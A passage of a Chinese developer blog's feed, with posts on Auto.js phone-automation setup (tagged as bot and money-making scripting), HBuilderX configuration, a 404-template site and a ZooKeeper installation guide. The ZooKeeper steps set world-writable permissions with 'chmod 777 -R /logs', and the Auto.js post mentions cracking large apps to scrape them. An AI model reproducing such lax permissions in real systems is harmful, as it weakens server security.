    <category term="autojs" scheme="https://seniortesting.club/categories/%E8%84%9A%E6%9C%AC/%E5%A4%96%E6%8C%82/autojs/"/>
    
    <category term="网赚" scheme="https://seniortesting.club/categories/%E8%84%9A%E6%9C%AC/%E5%A4%96%E6%8C%82/autojs/%E7%BD%91%E8%B5%9A/"/>
    
    <category term="auto.js" scheme="https://seniortesting.club/categories/%E8%84%9A%E6%9C%AC/%E5%A4%96%E6%8C%82/autojs/%E7%BD%91%E8%B5%9A/auto-js/"/>
    
    
  </entry>
  
  <entry>
    <title>autojs的功能介绍</title>
    <link href="https://seniortesting.club/posts/VQB3BIrUgj/"/>
    <id>https://seniortesting.club/posts/VQB3BIrUgj/</id>
    <published>2021-03-29T12:25:48.000Z</published>
    <updated>2021-04-18T13:00:39.459Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>快速对比了下,还是auto.js社区比较活跃,资料最多,唯一的遗憾是不能爬取大厂的app,但是有些人可以破解这个.后面了解下</p></blockquote><h2 id="auto-js的安装配置"><a href="#auto-js的安装配置" class="headerlink" title="auto.js的安装配置"></a>auto.js的安装配置</h2><ol><li><p>autojs开发环境的vscode插件下载,用于开发:<br><img src="https://cdn.jsdelivr.net/gh/alterhu2020/CDN/img/blog/20210331162416.png"></p></li><li><p>启动vscode代理服务端口,启动autojs服务, vscode中命令: Ctr + Alt + p，搜索启动命令并执行.</p></li></ol><p><img src="https://cdn.jsdelivr.net/gh/alterhu2020/CDN/img/blog/20210331161801.png"></p><ol start="3"><li>正常启动后vscode可以看到如下界面:</li></ol><p><img src="https://cdn.jsdelivr.net/gh/alterhu2020/CDN/img/blog/20210331161916.png"></p><ol start="4"><li><p>下载安卓模拟器&lt;**雷电模拟器**&gt;,下载apk安装包: <a href="https://github.com/kkevsekk1/AutoX/" target="_blank" rel="noopener">autox.js</a>, 并安装在模拟器中</p></li><li><p>通过模拟器右下角的安装按钮安装，安装成功后打开app，拉开左边的抽屉，<strong>开启无障碍服务</strong>和<strong>悬浮窗</strong>，该功能可与真是手机相同.如图所示:</p></li></ol><p><img src="https://cdn.jsdelivr.net/gh/alterhu2020/CDN/img/blog/20210331161412.png"></p><ol start="6"><li>模拟器或者手机连接vscode服务. 通常是打开模拟设置，WLAN, 高级,查找本地IP地址，在命令行输入ipconfig，找到和模拟器同一网段的IP地址, 打开auto.js app，点击连接电脑，输入电脑的IP地址并确定,连接.</li></ol><p> <img src="https://cdn.jsdelivr.net/gh/alterhu2020/CDN/img/blog/20210331162732.png"></p><ol start="7"><li>连接成功的话会在visual studio弹出提示</li></ol><p> <img src="https://cdn.jsdelivr.net/gh/alterhu2020/CDN/img/blog/20210331162845.png"></p><h2 id="auto-js的脚本开发调试"><a href="#auto-js的脚本开发调试" class="headerlink" title="auto.js的脚本开发调试"></a>auto.js的脚本开发调试</h2><ol><li><p>在VS Code中打开”<strong>Developer tools</strong>“视图,方式如下, 点击”help”-&gt;”Toggle Developer Tools”选项. 如下截图:<br><img src="https://cdn.jsdelivr.net/gh/alterhu2020/CDN/img/blog/20210331205225.png"></p></li><li><p>了解工作目录</p></li></ol><p>Auto.js 软件运行后显示的目录即为工作目录<br>在工作目录下的项目或脚本才会显示在 Auto.js 软件中<br>工作目录通常包含以下几种可能</p><ul><li>/内部存储/脚本/</li><li>/emulated/storage/0/脚本/</li><li>/internal storage/Scripts/</li><li>/emulated/storage/0/Scripts/</li></ul><h3 id="1-电脑端"><a href="#1-电脑端" class="headerlink" title="1. 电脑端"></a>1. 电脑端</h3><ol><li>安装 vscode， 在左边插件栏搜索安装<code>Auto.js-VSCodeExt</code>和<code>Auto.js-Pro-Ext</code>插件。</li><li>克隆项目 git clone <a href="https://github.com/wpc2333/AutoWatch.git" target="_blank" rel="noopener">https://github.com/wpc2333/AutoWatch.git</a></li><li>使用vscode打开项目。windows下使用快捷键<code>ctrlshift+P</code>，选择运行Auto.js:Start Server打开服务，手机端打开Auto.js 选择连接电脑，输入电脑的ip地址（手机电脑需要在同一局域网下）。</li><li>待手机连接上后右下角会出现提示，使用快捷键ctrlshift+P，选择运行<code>Auto.js:Save Project</code>即可将项目布置导手机上。<br>运行程序。</li><li>电脑端使用快捷键ctrlshift+P，选择运行<code>Auto.js:Run On Device</code>,选择自己的手机IP即可运行。</li><li>在手机端运行：打开Auto.js，选择AutoWatch，点击开始运行。</li></ol><h3 id="2-手机端"><a href="#2-手机端" class="headerlink" title="2. 手机端"></a>2. 手机端</h3><p>使用手机新建一个项目文件，将main.js的代码全部拷贝即可运行。另外网友开发了一个autojs的webpack打包工具: <a href="https://github.com/kkevsekk1/webpack-autojs" target="_blank" rel="noopener">webpack-autojs</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;快速对比了下,还是auto.js社区比较活跃,资料最多,唯一的遗憾是不能爬取大厂的app,但是有些人可以破解这个.后面了解下&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;auto-js的安装配置&quot;&gt;&lt;a href=&quot;#auto-js的安装配</summary>
      
    
    
    
    <category term="autojs" scheme="https://seniortesting.club/categories/autojs/"/>
    
    <category term="网赚" scheme="https://seniortesting.club/categories/autojs/%E7%BD%91%E8%B5%9A/"/>
    
    <category term="easyclick" scheme="https://seniortesting.club/categories/autojs/%E7%BD%91%E8%B5%9A/easyclick/"/>
    
    
  </entry>
  
  <entry>
    <title>404优秀网页收集</title>
    <link href="https://seniortesting.club/posts/7270b080/"/>
    <id>https://seniortesting.club/posts/7270b080/</id>
    <published>2021-03-26T13:51:30.000Z</published>
    <updated>2021-04-18T13:00:39.463Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>几乎我们看到的每个网站都离不开404找不到网页页面,无意中居然发现了这个网站.</p></blockquote><p>推荐一个网站,<a href="https://404.life/" target="_blank" rel="noopener">404模板网</a>，致力于提供最全的404网页源码下载。不仅有模板,还有一些创意设计,可以查找到一些网站再用的404网页,提供了一个超全的404模板.</p>]]></content>
    
    
      
      
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;几乎我们看到的每个网站都离不开404找不到网页页面,无意中居然发现了这个网站.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;推荐一个网站,&lt;a href=&quot;https://404.life/&quot; target=&quot;_blank&quot; rel=&quot;noopene</summary>
      
    
    
    
    <category term="软件开发" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91/"/>
    
    <category term="前端技术" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91/%E5%89%8D%E7%AB%AF%E6%8A%80%E6%9C%AF/"/>
    
    <category term="模板" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91/%E5%89%8D%E7%AB%AF%E6%8A%80%E6%9C%AF/%E6%A8%A1%E6%9D%BF/"/>
    
    
    <category term="404" scheme="https://seniortesting.club/tags/404/"/>
    
    <category term="网站模板" scheme="https://seniortesting.club/tags/%E7%BD%91%E7%AB%99%E6%A8%A1%E6%9D%BF/"/>
    
  </entry>
  
  <entry>
    <title>hbuilderx工具真香定理</title>
    <link href="https://seniortesting.club/posts/dqrn4e6WLT/"/>
    <id>https://seniortesting.club/posts/dqrn4e6WLT/</id>
    <published>2021-03-26T12:58:52.000Z</published>
    <updated>2021-04-18T13:00:39.459Z</updated>
    
    <content type="html"><![CDATA[<p>hbuilderx开发工具学习</p><h2 id="不错的移动端滚动组件mescroll"><a href="#不错的移动端滚动组件mescroll" class="headerlink" title="不错的移动端滚动组件mescroll"></a>不错的移动端滚动组件<code>mescroll</code></h2><ul><li>官方文档： <a href="http://www.mescroll.com/index.html?v=190701" target="_blank" rel="noopener">http://www.mescroll.com/index.html?v=190701</a></li><li>vue组件地址: node_modules/mescroll.js/mescroll.vue</li></ul><h2 id="真香系列-HBuilderX入门"><a href="#真香系列-HBuilderX入门" class="headerlink" title="真香系列- HBuilderX入门"></a>真香系列- HBuilderX入门</h2><p>配置信息：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">&quot;editor.colorScheme&quot;</span> : <span class="string">&quot;Default&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;editor.saveOnFocusLost&quot;</span> : <span class="literal">true</span>,</span><br><span class="line">    <span class="attr">&quot;files.autoSaveDelay&quot;</span> : <span class="number">1</span>,</span><br><span class="line">    <span class="attr">&quot;node.path&quot;</span> : <span class="string">&quot;E:/nodejs/node.exe&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;npm.path&quot;</span> : <span class="string">&quot;E:/nodejs/npm.cmd&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;terminal.type&quot;</span> : <span class="string">&quot;内置终端&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;view.remoteDebug.openOnRunDevice&quot;</span> : <span class="literal">true</span>,</span><br><span class="line">    <span class="attr">&quot;weApp.devTools.path&quot;</span> : <span class="string">&quot;E:/Program Files/Tencent/微信web开发者工具&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;files.associations.suffixs&quot;</span> : <span class="string">&quot;md,json&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;files.associations.contextmenu&quot;</span> : <span class="literal">true</span>,</span><br><span class="line">    <span class="attr">&quot;editor.longLineIndicator&quot;</span> : <span class="literal">true</span>,</span><br><span class="line">    <span class="attr">&quot;alipayApp.devTools.path&quot;</span> : <span class="string">&quot;E:/Program Files/小程序开发者工具/小程序开发者工具.exe&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;baiduApp.devTools.path&quot;</span> : <span class="string">&quot;C:\\Users\\Walter\\AppData\\Local\\Programs\\swan-ide-gui\\百度开发者工具.exe&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;bytedanceApp.devTools.path&quot;</span> : <span class="string">&quot;C:\\Users\\Walter\\AppData\\Local\\Programs\\bytedanceide\\字节跳动开发者工具.exe&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="IOS开发发布"><a href="#IOS开发发布" class="headerlink" title="IOS开发发布"></a>IOS开发发布</h2><blockquote><p> <a href="http://ask.dcloud.net.cn/article/152" target="_blank" rel="noopener">参考文章</a></p></blockquote><ol><li>在Mac上生成对应的<code>CertificateSigningRequest.certSigningRequest</code>文件，</li><li>进入苹果开发者中心，生成对应的开发/生产 certification证书，里面会提示需要选择上面的证书请求文件。</li><li>在Mac上下载上面生成的证书例如<code>development.cer</code>，双击该文件导入到Keychain Access；</li><li>在证书列表中选择Export “Developer” ..，导出证书，其中会提示输入证书的密码和确认密码；</li><li>保存开发(Production)证书(如“HBuilderCert.p12”)</li><li>进入开发者中心，申请描述文件，下载保存开发描述文件（如HBuilderProfileDistribution.mobileprovision）</li><li>hbuilder生成的是打包的ipa文件</li></ol><h2 id="vue注意事项"><a href="#vue注意事项" class="headerlink" title="vue注意事项"></a>vue注意事项</h2><ol><li>建议使用 uni-app 的 onReady代替 vue 的 mounted。</li><li>建议使用 uni-app 的 onLoad 代替 vue 的 created。</li></ol><h2 id="truetype-字体"><a href="#truetype-字体" class="headerlink" title="truetype 字体"></a>truetype 字体</h2><p>使用：  /* chrome, firefox, opera, Safari, Android, iOS 4.2+ */<br>TrueType是由AppleComputer公司和Microsoft公司联合提出的一种新型数学字形描述技术。它用数学函数描述字体轮廓外形，含有字形构造、颜色填充、数字描述函数、流程条件控制、栅格处理控制、附加提示控制等指令。TrueType采用几何学中二次B样条曲线及直线来描述字体的外形轮廓，其特点是：TrueType既可以作打印字体，又可以用作屏幕显示；由于它是由指令对字形进行描述，因此它与分辨率无关，输出时总是按照打印机的分辨率输出。无论放大或缩小，字符总是光滑的，不会有锯齿出现。但相对PostScript字体来说，其质量要差一些。特别是在文字太小时，就表现得不是很清楚。<br>TrueType字体的优势是什么？<br>答：TrueType字体具有如下优势：①真正的所见即所得字体。由于True-Type字体支持几乎所有输出设备，因而无论在屏幕、激光打印机、激光照排机上，还是在彩色喷墨打印机上，均能以设备的分辨率输出，因而输出很光滑。②支持字体嵌入技术。存盘时可将文件中使用的所有TrueType字体采用嵌入方式一并存入文件之中，使整个文件中所有字体可方便地传递到其它计算机中使用。嵌入技术可保证未安装相应字体的计算机能以原格式使用原字体打印。③操作系统的兼容性。MAC和PC机均支持TrueType字体，都可以在同名软件中直接打开应用文件而不需要替换字体。</p><p>其他字体： woff (Web Open Font Format，简称WOFF), 是一种网页所采用的字体格式标准.</p><p>字体介绍：<a href="https://www.cnblogs.com/sexintercourse/p/9479389.html" target="_blank" rel="noopener">https://www.cnblogs.com/sexintercourse/p/9479389.html</a></p><p>.eot，Embedded Open Type，主要用于早期版本的IE，是其专有格式，带有版权保护和压缩。<br>.ttf，TrueType，在操作系统里更为常见，在web上使用的话，是为了兼容早期仅支持TTF和OTF的浏览器。由于体积比较大，还需要服务器额外压缩。<br>.woff，Web Open Font Format，可以看作是ttf的再封装，加入了压缩和字体来源信息，通常比ttf小40%。也是当前web字体的主流格式。<br>.woff2，Web Open Font Format 2.0，相比woff最大的优化应该是加强了字体的压缩比。目前支持的浏览器只有正在互彪版本号的Chrome和Firefox。</p><p>woff和woff2的文件，woff2要小25%</p><blockquote><p>uniapp中不能使用多色图标，而且多色图标兼容性较差，浏览器渲染 SVG 的性能一般，还不如 png。所以我们这里推荐就使用的是ttf的图标，虽然是单色我们可以通过设置对应的背景色达到可以实现双色的效果。 iconfont的class引用图标其实就是采用的unicode的方式使用图标，只是语义化采用class来标记图标更简单了。 在设置对应的tabbar的text的时候还是需要使用unicode的方式。</p></blockquote><p>使用方法：</p><ol><li>本地环境：<br>在iconfont中挑选好图标,切换到<code>unicode</code>,然后复制里面的所有内容:<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">@font-face &#123;</span><br><span class="line">  font-family: &#39;iconfont&#39;;  &#x2F;* project id 1284327 *&#x2F;</span><br><span class="line">  src: url(&#39;&#x2F;&#x2F;at.alicdn.com&#x2F;t&#x2F;font_1284327_s5jrvqwkz1b.eot&#39;);</span><br><span class="line">  src: url(&#39;&#x2F;&#x2F;at.alicdn.com&#x2F;t&#x2F;font_1284327_s5jrvqwkz1b.eot?#iefix&#39;) format(&#39;embedded-opentype&#39;),</span><br><span class="line">  url(&#39;&#x2F;&#x2F;at.alicdn.com&#x2F;t&#x2F;font_1284327_s5jrvqwkz1b.woff2&#39;) format(&#39;woff2&#39;),</span><br><span class="line">  url(&#39;&#x2F;&#x2F;at.alicdn.com&#x2F;t&#x2F;font_1284327_s5jrvqwkz1b.woff&#39;) format(&#39;woff&#39;),</span><br><span class="line">  url(&#39;&#x2F;&#x2F;at.alicdn.com&#x2F;t&#x2F;font_1284327_s5jrvqwkz1b.ttf&#39;) format(&#39;truetype&#39;),</span><br><span class="line">  url(&#39;&#x2F;&#x2F;at.alicdn.com&#x2F;t&#x2F;font_1284327_s5jrvqwkz1b.svg#iconfont&#39;) format(&#39;svg&#39;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>将上面的所有加上https，如下：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">@font-face &#123;</span><br><span class="line">  font-family: &#39;msharing-font&#39;;  &#x2F;* 自定义，避免问题，project id 1284327 *&#x2F;</span><br><span class="line">  src: url(&#39;https:&#x2F;&#x2F;at.alicdn.com&#x2F;t&#x2F;font_1284327_s5jrvqwkz1b.eot&#39;);</span><br><span class="line">  src: url(&#39;https:&#x2F;&#x2F;at.alicdn.com&#x2F;t&#x2F;font_1284327_s5jrvqwkz1b.eot?#iefix&#39;) format(&#39;embedded-opentype&#39;),</span><br><span class="line">  url(&#39;https:&#x2F;&#x2F;at.alicdn.com&#x2F;t&#x2F;font_1284327_s5jrvqwkz1b.woff2&#39;) format(&#39;woff2&#39;),</span><br><span class="line">  url(&#39;https:&#x2F;&#x2F;at.alicdn.com&#x2F;t&#x2F;font_1284327_s5jrvqwkz1b.woff&#39;) format(&#39;woff&#39;),</span><br><span class="line">  url(&#39;https:&#x2F;&#x2F;at.alicdn.com&#x2F;t&#x2F;font_1284327_s5jrvqwkz1b.ttf&#39;) format(&#39;truetype&#39;),</span><br><span class="line">  url(&#39;https:&#x2F;&#x2F;at.alicdn.com&#x2F;t&#x2F;font_1284327_s5jrvqwkz1b.svg#iconfont&#39;) format(&#39;svg&#39;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>定义一个样式可以通过class的方式直接使用：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">.iconfont &#123;</span><br><span class="line">    font-family: &quot;msharing-font&quot; !important;</span><br><span class="line">    font-size: 24px;</span><br><span class="line">font-weight: normal;</span><br><span class="line">font-style: normal;</span><br><span class="line">line-height: 1;</span><br><span class="line">display: inline-block;</span><br><span class="line">text-decoration: none;</span><br><span class="line">-webkit-font-smoothing: antialiased;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;hbuilderx开发工具学习&lt;/p&gt;
&lt;h2 id=&quot;不错的移动端滚动组件mescroll&quot;&gt;&lt;a href=&quot;#不错的移动端滚动组件mescroll&quot; class=&quot;headerlink&quot; title=&quot;不错的移动端滚动组件mescroll&quot;&gt;&lt;/a&gt;不错的移动端滚动组</summary>
      
    
    
    
    <category term="开发工具" scheme="https://seniortesting.club/categories/%E5%BC%80%E5%8F%91%E5%B7%A5%E5%85%B7/"/>
    
    
    <category term="vue" scheme="https://seniortesting.club/tags/vue/"/>
    
  </entry>
  
  <entry>
    <title>zookeeper学习知识点整理</title>
    <link href="https://seniortesting.club/posts/5GThz4fICO/"/>
    <id>https://seniortesting.club/posts/5GThz4fICO/</id>
    <published>2021-03-26T12:54:54.000Z</published>
    <updated>2021-04-18T13:00:39.467Z</updated>
    
    <content type="html"><![CDATA[<p>zookeeper配置中心</p><h3 id="zookeeper-单机安装配置"><a href="#zookeeper-单机安装配置" class="headerlink" title="zookeeper 单机安装配置"></a>zookeeper 单机安装配置</h3><blockquote><p>参考文章: <a href="https://blog.csdn.net/pucao_cug/article/details/71240246" target="_blank" rel="noopener">https://blog.csdn.net/pucao_cug/article/details/71240246</a></p></blockquote><ul><li>下载安装 <code>wget http://mirror.bit.edu.cn/apache/zookeeper/current/apache-zookeeper-3.5.5-bin.tar.gz</code></li><li>解压缩tar.gz到目录： <code>/opt/apache-zookeeper-3.5.5</code></li><li>创建用户，通用方式：</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 创建用户和创建组，用户systemctl启动用</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> sudo groupadd zookeeper</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> sudo useradd -d /opt/apache-zookeeper-3.5.5-bin -s /bin/<span class="literal">false</span> -g zookeeper zookeeper</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 列出所有的用户组： cut -d: -f1 /etc/group | sort</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 列出所有的用户: sudo cat /etc/passwd</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 对应目录赋予权限： chown -R zookeeper:zookeeper /opt/apache-zookeeper-3.5.5-bin</span></span><br></pre></td></tr></table></figure><ul><li>进入<code>cnf</code>目录复制一份配置文件： <code>sudo cp zoo_sample.cfg zoo.cfg</code></li><li>创建日志目录： <code>sudo mkdir /logs/zookeeper &amp;&amp; chmod 777 -R /logs</code></li><li>修改<code>zoo.cfg</code>配置信息：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># The number of milliseconds of each tick</span></span><br><span class="line"><span class="comment"># 它用来控制心跳和超时，默认情况下最小的会话超时时间为两倍的 tickTime ，就是minSessionTimeout=</span></span><br><span class="line">tickTime=<span class="number">2000</span></span><br><span class="line"><span class="comment"># The number of ticks that the initial </span></span><br><span class="line"><span class="comment"># synchronization phase can take</span></span><br><span class="line"><span class="comment"># 集群配置，此配置表示，允许 follower （相对于 leader 而言的“客户端”）连接并同步到 leader 的初始化连接时间，它以 tickTime 的倍数来表示。当超过设置倍数的 tickTime 时间，则连接失败。</span></span><br><span class="line">initLimit=<span class="number">10</span></span><br><span class="line"><span class="comment"># The number of ticks that can pass between </span></span><br><span class="line"><span class="comment"># sending a request and getting an acknowledgement</span></span><br><span class="line"><span class="comment"># 集群配置，此配置表示， leader 与 follower 之间发送消息，请求和应答时间长度。如果 follower 在设置的时间内不能与leader 进行通信，那么此 follower 将被丢弃。</span></span><br><span class="line">syncLimit=<span class="number">5</span></span><br><span class="line"><span class="comment"># the directory where the snapshot is stored.</span></span><br><span class="line"><span class="comment"># do not use /tmp for storage, /tmp here is just </span></span><br><span class="line"><span class="comment"># example sakes.</span></span><br><span class="line"><span class="comment"># 存储内存中数据库快照的位置</span></span><br><span class="line">dataDir=/opt/apache-zookeeper-<span class="number">3.5</span><span class="number">.5</span>-<span class="built_in">bin</span>/data</span><br><span class="line"><span class="comment"># 这个操作将管理机器把事务日志写入到“ dataLogDir ”所指定的目录，而不是“ dataDir ”所指定的目录。这将允许使用一个专用的日志设备并且帮助我们避免日志和快照之间的竞争</span></span><br><span class="line">dataLogDir=/logs/zookeeper</span><br><span class="line"><span class="comment"># the port at which the clients will connect</span></span><br><span class="line"><span class="comment"># 客户端连接的端口</span></span><br><span class="line">clientPort=<span class="number">2181</span></span><br><span class="line"><span class="comment"># the maximum number of client connections.</span></span><br><span class="line"><span class="comment"># increase this if you need to handle more clients</span></span><br><span class="line"><span class="comment"># 这个操作将限制连接到 ZooKeeper 的客户端的数量，限制并发连接的数量，它通过 IP 来区分不同的客户端。此配置选项可以用来阻止某些类别的 Dos 攻击。将它设置为 0 或者忽略而不进行设置将会取消对并发连接的限制。</span></span><br><span class="line">maxClientCnxns=<span class="number">60</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Be sure to read the maintenance section of the </span></span><br><span class="line"><span class="comment"># administrator guide before turning on autopurge.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># http://zookeeper.apache.org/doc/current/zookeeperAdmin.html#sc_maintenance</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># The number of snapshots to retain in dataDir</span></span><br><span class="line"><span class="comment">#autopurge.snapRetainCount=3</span></span><br><span class="line"><span class="comment"># Purge task interval in hours</span></span><br><span class="line"><span class="comment"># Set to &quot;0&quot; to disable auto purge feature</span></span><br><span class="line"><span class="comment">#autopurge.purgeInterval=1</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>– 配置环境变量：<code>sudo nano /etc/profile</code>:</p><blockquote><p>配置环境变量的目的是为了直接只用zookeeper中bin目录下的命令，如果不配置zookeeper的home路径，并不影响zookeeper启动</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">export ZOOKEEPER_HOME&#x3D;&#x2F;opt&#x2F;apache-zookeeper-3.5.5-bin</span><br><span class="line">export PATH&#x3D;$ZOOKEEPER_HOME&#x2F;bin:$PATH</span><br></pre></td></tr></table></figure><p>– 启动服务后台运行：<code>/opt/apache-zookeeper-3.5.5-bin/bin/zkServer.sh start</code><br>– 启动服务前台运行：<code>/opt/apache-zookeeper-3.5.5-bin/bin/zkServer.sh start-foreground</code><br>– 查看服务是否启动: <code>/opt/apache-zookeeper-3.5.5-bin/bin/zkServer.sh status</code></p><p>– 制作启动开机自启动: <code>sudo nano /lib/systemd/system/zookeeper.service</code><br>– 设置开机启动: <code>sudo systemctl daemon-reload &amp;&amp; systemctl enable zookeeper.service</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">[Unit]</span><br><span class="line">Description&#x3D;zookeeper</span><br><span class="line">After&#x3D;network.target remote-fs.target nss-lookup.target</span><br><span class="line"></span><br><span class="line">[Service]</span><br><span class="line">Type&#x3D;forking</span><br><span class="line"></span><br><span class="line">User&#x3D;zookeeper</span><br><span class="line">Group&#x3D;zookeeper</span><br><span class="line"></span><br><span class="line">ExecStart&#x3D;&#x2F;opt&#x2F;apache-zookeeper-3.5.5-bin&#x2F;bin&#x2F;zkServer.sh start</span><br><span class="line">ExecReload&#x3D;&#x2F;opt&#x2F;apache-zookeeper-3.5.5-bin&#x2F;bin&#x2F;zkServer.sh restart</span><br><span class="line">ExecStop&#x3D;&#x2F;opt&#x2F;apache-zookeeper-3.5.5-bin&#x2F;bin&#x2F;zkServer.sh stop</span><br><span class="line"></span><br><span class="line">[Install]</span><br><span class="line">WantedBy&#x3D;multi-user.target</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="zookeeper启动问题"><a href="#zookeeper启动问题" class="headerlink" title="zookeeper启动问题"></a>zookeeper启动问题</h3><ol><li>执行<code>/zkServer.sh start</code>，看到启动正常，但是执行<code>zkServer.sh status</code>确报：</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Error contacting service. It is probably not running</span><br></pre></td></tr></table></figure><p>这说明并没有启动成功.我们可以通过bin目录下面的<code>bin/zookeeper.out</code>来查看问题原因,但是没有找到这个文件,后来看到执行这个命令让命令在前台运行:<br><code>sudo ./zkServer.sh start-foreground</code> :</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;usr&#x2F;bin&#x2F;java</span><br><span class="line">ZooKeeper JMX enabled by default</span><br><span class="line">Using config: &#x2F;opt&#x2F;apache-zookeeper-3.5.5&#x2F;bin&#x2F;..&#x2F;conf&#x2F;zoo.cfg</span><br><span class="line">错误: 找不到或无法加载主类 org.apache.zookeeper.server.quorum.QuorumPeerMain</span><br></pre></td></tr></table></figure><p>发现原来是自己下载的zookeeper版本是源码版本，正确的版本应该是: <a href="http://mirror.bit.edu.cn/apache/zookeeper/current/apache-zookeeper-3.5.5-bin.tar.gz" target="_blank" rel="noopener">http://mirror.bit.edu.cn/apache/zookeeper/current/apache-zookeeper-3.5.5-bin.tar.gz</a></p><ol start="2"><li>执行<code>systemctl start zookeeper</code>报错: <code>zkServer.sh[985]: Error: JAVA_HOME is not set and java could not be found in PATH.</code></li></ol><blockquote><p>尽管配置了JAVA_HOME在<code>/etc/profile</code>中，但是还是需要下面的命令执行：</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># update-alternatives --install &#x2F;usr&#x2F;bin&#x2F;java java &#x2F;opt&#x2F;jdk1.8.0_211&#x2F;bin&#x2F;java 1</span><br><span class="line"># update-alternatives --install &#x2F;usr&#x2F;bin&#x2F;javac javac &#x2F;opt&#x2F;jdk1.8.0_211&#x2F;bin&#x2F;javac 1</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;zookeeper配置中心&lt;/p&gt;
